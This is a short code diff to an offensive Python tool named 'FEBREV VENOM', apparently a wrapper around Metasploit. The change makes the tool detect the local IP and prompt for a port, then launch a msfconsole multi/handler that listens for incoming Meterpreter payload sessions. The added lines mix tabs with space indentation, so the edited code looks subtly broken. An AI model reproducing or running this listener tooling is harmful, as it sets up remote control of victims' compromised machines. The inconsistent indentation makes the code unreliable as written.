@@ -1,5 +1,6 @@
 import os
 import webbrowser
+import socket
 os.system('echo -e "\033[1m \e[33m WELCOME TO FEBREV VENOM"')
 print("""
   ______ ______ ____  _____  ________      __ __      ________ _   _  ____  __  __ 
@@ -231,7 +232,9 @@ def venom():
          msfp=input("ENTER THE NAME OF THE PAYLOAD YOU WANNA LISTEN : ")
          print("STARTING METASPLOIT METERPRETER FOR YOUR PAYLOAD....")
          os.system("service postgresql start")
-         os.system(f"msfconsole -x 'use multi/handler; set LHOST {lhost}; set LPORT {lport}; set PAYLOAD {msfp}; exploit'")
+	 lip=socket.gethostbyname(socket.gethostname())
+	 localport=input("ENTER THE PORT YOU USED IN PAYLOAD : ")
+         os.system(f"msfconsole -x 'use multi/handler; set LHOST {lip}; set LPORT {localport}; set PAYLOAD {msfp}; exploit'")
     else:
          print("EXITING.....BYE BYE>>>>")
          os.system("exit")
